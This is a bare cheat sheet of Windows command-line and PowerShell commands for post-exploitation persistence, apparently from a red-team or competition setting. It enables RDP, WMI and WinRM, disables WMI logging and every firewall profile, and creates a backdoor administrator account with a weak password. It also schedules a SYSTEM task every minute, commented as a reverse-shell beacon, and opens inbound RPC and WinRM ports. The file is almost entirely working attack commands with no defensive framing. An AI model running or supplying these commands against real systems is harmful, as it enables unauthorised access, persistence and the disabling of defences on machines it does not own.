


```python
# Enable RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f

# Enable WMI
sc config winmgmt start= auto
sc start winmgmt
netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes
reg add "HKLM\SOFTWARE\Microsoft\WBEM\CIMOM" /v "Logging" /t REG_DWORD /d 0 /f

# Enable winrm
netsh advfirewall firewall set rule group="Windows Remote Management" new enable=yes
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN\Logging" /v "WSMan" /t REG_DWORD /d 1 /f
sc start WinRM

# Disable firewall
netsh advfirewall set allprofiles state off

# Add an administrative user to establish persistence
net user sawyer Password123! /add
net localgroup administrators sawyer /add

# Add a beacon that pings a reverse shell every minute
schtasks /create /sc minute /mo 1 /tn "chillin" /tr C:\ProgramData\System\chillin.bat /ru "SYSTEM"

# to have any service start with the system use this
sc config WinRM start= auto
sc config winmgmt start= auto

# Allow RPC Port (Port 135):
New-NetFirewallRule -DisplayName "Allow RPC Port 135" -Direction Inbound -Protocol TCP -LocalPort 135 -Action Allow

# Allow Dynamic RPC Ports (49152-65535):
New-NetFirewallRule -DisplayName "Allow Dynamic RPC Ports" -Direction Inbound -Protocol TCP -LocalPort 49152-65535 -Action Allow

# Allow WinRM (Port 5985 for HTTP or 5986 for HTTPS):
New-NetFirewallRule -DisplayName "Allow WinRM Port 5985" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow

# Confirm the rules
Get-NetFirewallRule -DisplayName "Allow RPC Port 135"
Get-NetFirewallRule -DisplayName "Allow Dynamic RPC Ports"
Get-NetFirewallRule -DisplayName "Allow WinRM Port 5985"

#restart winrm if needed
Restart-Service winrm
```



